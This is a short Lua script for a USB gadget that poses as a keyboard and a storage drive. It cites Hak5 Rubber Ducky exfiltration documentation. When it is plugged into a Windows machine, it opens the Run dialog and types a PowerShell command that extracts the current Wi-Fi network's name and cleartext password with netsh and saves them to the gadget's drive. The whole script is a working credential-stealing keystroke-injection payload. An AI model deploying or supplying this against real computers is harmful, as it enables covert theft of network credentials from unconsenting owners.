---
--- Copy a file from the system to a mass storage gadget
--- https://docs.hak5.org/hak5-usb-rubber-ducky/advanced-features/exfiltration
---

require('common')

local LABEL = "COMPOSITE"

kb = luausb.create({ type = "keyboard"}, { type = "storage", label = LABEL })

while true do
    print("idle")

    -- poll until usb plugged in
    wait_for_state('configured')
    wait_for_detect(kb)

    print("running")
    wait(2000) -- wait in case explorer pops up

    kb:chord(MOD_LSUPER, KEY_R)
    wait(1000)
    kb:string("powershell \"$m=(Get-Volume -FileSystemLabel '" .. LABEL .. "').DriveLetter;"
              .. "netsh wlan show profile name=(Get-NetConnectionProfile).Name key="
              .. "clear|?{$_-match'SSID n|Key C'}|%{($_ -split':')[1]}>>$m':\\'$env:"
              .. "computername'.txt'\"\n")

    print("done")
    wait_for_state("not attached")

    print("disconnected")
end

